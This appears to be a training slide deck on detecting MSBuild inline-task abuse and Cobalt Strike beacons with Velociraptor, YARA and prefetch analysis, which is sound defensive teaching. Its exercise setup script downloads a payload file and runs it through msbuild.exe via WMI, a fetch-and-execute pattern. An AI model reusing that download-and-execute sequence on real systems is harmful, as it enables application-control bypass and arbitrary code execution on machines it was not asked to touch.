<!-- .slide: class="title" -->

# MSBuild based attacks

---

<!-- .slide: class="content" -->
## Microsoft Build Engine

<div class="small-font">

* T1127.001 - Trusted Developer Utilities Proxy Execution: MSBuild
    * https://attack.mitre.org/techniques/T1127/001/
    * https://lolbas-project.github.io/lolbas/Binaries/Msbuild/
* .NET build feature used to load project files
* C# or Visual Basic code to be inserted into an XML project file.
    * Lateral movement
    * WMI
    * Service Control Manager (SCM)
    * Also observed initial maldoc or persistance
* Common attack framework availability
    * Metasploit module
    * Cobalt Strike aggressor script
    * Many other templates on github
* This is essentially an applocker / whitelisting bypass.

</div>

Note:

Adversaries may use MSBuild to proxy execution of code through a
trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a
software build platform used by Visual Studio. It handles XML
formatted project files that define requirements for loading and
building various platforms and configurations.[1]

Adversaries can abuse MSBuild to proxy execution of malicious
code. The inline task capability of MSBuild that was introduced in
.NET version 4 allows for C# or Visual Basic code to be inserted into
an XML project file.[1][2] MSBuild will compile and execute the inline
task. MSBuild.exe is a signed Microsoft binary, so when it is used
this way it can execute arbitrary code and bypass application control
defenses that are configured to allow MSBuild.exe execution.[3]

https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/evasion/windows/applocker_evasion_msbuild.md
https://github.com/threatexpress/aggressor-scripts/tree/master/wmi_msbuild
https://github.com/Cn33liz/MSBuildShell
https://github.com/3gstudent/msbuild-inline-task


---


<!-- .slide: class="full_screen_diagram" -->
## MSBuild: Cobalt Strike teamserver

Typical Cobalt Strike Lateral Movement

![](/modules/msbuild_engine/MSBuild_Cobaltstrike.png)

---


<!-- .slide: class="content" -->
## MSBuild: Detection ideas

* Process Telemetry
   * Process chain
   * Command Line
* Disk
* Forensic evidence of execution
   * Prefetch
* Event Logs
   * WMI
   * Service Control
   * Security 5145 - \\*\C$

---


<!-- .slide: class="content" -->
## MSBuild: Disk - template file

<img src="/modules/msbuild_engine/MSBuild_disk.png" style="width: 100%"/>


---

<!-- .slide: class="content" -->
## MSBuild: Disk - template

<img src="/modules/msbuild_engine/MSBuild_disk-2.png" style="width: 100%"/>

---

<!-- .slide: class="content" -->
## Detection ideas

* Velociraptor can deploy Yara easily in combination with many other capabilities.

    * In this case we want to search for template files similar to  previously discussed.
    * Can we find the Cobalt Strike payload?
    * Can we find other artifacts that may indicate compromise?

---

<!-- .slide: class="content" -->
## Detection ideas

<div class="small-font">

* Some yara based detection artifacts include:
    * `Generic.Detection.Yara.Glob` - cross platform glob based file search and yara
    * `Generic.Detection.Yara.Zip` - cross platform archive content search and yara scan
    * `Windows.Detection.Yara.NTFS` - Windows NTFS file search and yara
    * `Windows.Detection.Yara.Process` - Windows process yara scan (default is Cobalt Strike)
    * `Windows.Detection.Yara.PhysicalMemory` - Windows Physical memory yara scan (winpmem)
    * `Linux.Detection.Yara.Process`  - Linux process yara

---

<!-- .slide: class="content" -->
## MSBuild: Exercise description

<div class="over-height">

```yara

rule MSBuild_template {
   meta:
      description = "MSBuild template. Detects MSBuild variable setup and generic template strings."
   strings:
      // Target variables in template
      $s1  = "byte[] key_code = new byte[" ascii
      $s2  = "byte[] buff = new byte[" ascii

      // Target Other strings
      $s8  = "<Code Type=\"Class\" Language=\"cs\">" ascii
      $s9  = "<![CDATA[" ascii
      $s10 = "[DllImport(" ascii

   condition:
      // Target headers
      ( uint16(0) == 0x3c0a or uint8(0) == 0x3c ) // \n< or < at 0
      and any of ($s*)
}
```

</div>

---


<!-- .slide: class="content" -->
## MSBuild exercise

A script to prepare exercise data is available here: [msbuild.ps1](/resources/msbuild.ps1)

```powershell
## MSBuild setup

# 0. If server disable prefetch so we generate prefetch artifacts
 if ( $(Get-CimInstance -Class CIM_OperatingSystem).Caption -like "*Server*" ) {
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 3 /f
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Prefetcher" /v MaxPrefetchFiles /t REG_DWORD /d 8192 /f
 Enable-MMAgent –OperationAPI -ErrorAction SilentlyContinue
 Start-Service Sysmain -ErrorAction SilentlyContinue
}

# 1. Download payload
$Url = "https://present.velocidex.com/resources/kUgJI.TMP"
$dest = "\\127.0.0.1\C$\Windows\Temp\kUgJI.TMP"

Remove-Item -Path $dest -force -ErrorAction SilentlyContinue
Invoke-WebRequest -Uri $Url -OutFile $dest -UseBasicParsing

# 2. Execute payload
Invoke-WmiMethod -ComputerName 127.0.0.1 -Name Create -Class Win32_PROCESS "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe C:\Windows\Temp\kUgJI.TMP /noconsolelogger"
```

---

<!-- .slide: class="content" -->
## MSBuild Exercise

<div class="container small-font">
<div class="col">

* Detect payload on disk with a hunt for `Generic.Glob.Yara`
    * Add your created yara - [msbuild.yara](/resources/msbuild.yara)
    * Use file size bounds for performance 5MB - 5KB large beacon to small shellcode loader.
    * Target `C:\Windows\Temp` (or where you dropped the file)
    * Select upload file
* Velociraptor enables post processing on uploaded files.
    * Can you extract the beacon using xor in VQL?
    * We will walk through this one!

</div>
<div class="col">

* `Generic.Glob.Yara` Parameters

<img src="/modules/msbuild_engine/MSBuild_YaraHunt.png" class="inset" />

</div>
</div>

---

<!-- .slide: class="content" -->
## MSBuild: Evidence of execution - prefetch

<div class="small-font">

* Prefetch is a forensic artifact that is available on Windows workstations.
* designed to increase performance by assisting application pre-loading
* provides evidence of execution
    * name, execution times and execution count
    * Location is `C:\Windows\Prefetch\*.pf`
    * Format is `<Exe name>-<Hash>.pf`
    * Hash calculated based on folder path of executable and the
      command line options of certain programs (e.g., svchost.exe)
    * 1024 prefetch files in Win8+ (only 128 on Win7!)
    * Different formats across OS versions.
    * E.g Win10 prefetch is now compressed

</div>

---

<!-- .slide: class="content" -->
## Windows.Detection. PrefetchHunter

<div class="container small-font">
<div class="col">

* Available on Velociraptor artifact exchange.
* Allows users to hunt for accessed files by process in prefetch.
* Returned rows include
    * accessed file
    * prefetch metadata
    * Best used to hunt for rare process execution.
</div>
<div class="col">

<img src="/modules/msbuild_engine/MSBuild_Prefetch.png" style="bottom: inherit" class="inset" />

</div>
</div>

<img src="/modules/msbuild_engine/MSBuild_Prefetch_results.png"/>

---

<!-- .slide: class="title" -->

# Memory artifacts

## Some threats are memory only

---

<!-- .slide: class="content" -->
## Detect Cobalt Strike Beacon

* Run the program inject.exe:
    * This program will inject artificial data from Cobalt Strike
samples into other processes The data is not actually executable but
will trigger a hit for memory scanning because it contains common Yara
patterns.
    * https://github.com/Velocidex/injector/releases
    * Find a host process and provide its PID to the loader.exe

---

<!-- .slide: class="content" -->
## Inject beacon into process

Choose any random process to host our "beacon" sample.
Sample is not actually running

![](/modules/msbuild_engine/InjectCSBeacon.png)

---

<!-- .slide: class="content" -->
## Search for beacon in memory

<div class="container small-font">
<div class="col">

* Use `Windows.Detection. Yara.Process` to search process memory for a
yara signature.
* Can upload process memory dumps for matching processes - these can be
opened with windbg

</div>
<div class="col">

<img src="/modules/msbuild_engine/ProcessYaraCollection.png" style="bottom: inherit" class="inset" />

</div>
</div>

---

<!-- .slide: class="full_screen_diagram" -->

## Detecting Cobalt Strike in memory

![](/modules/msbuild_engine/ProcessYaraResults.png)

---

<!-- .slide: class="content" -->
## Decoding Cobalt Strike Config

* It is very important to identify how Cobalt strike is configured when you detect it
* You can block the Cobalt Strike beacon address at the network perimeter
* Deploy Yara rules to identify the configuration itself.
* Cobalt Strike Config is heavily obfuscated in memory
* Velociraptor can parse memory structures in VQL

---

<!-- .slide: class="content" -->
## Extract configuration data from memory

![](/modules/msbuild_engine/CSConfig.png)
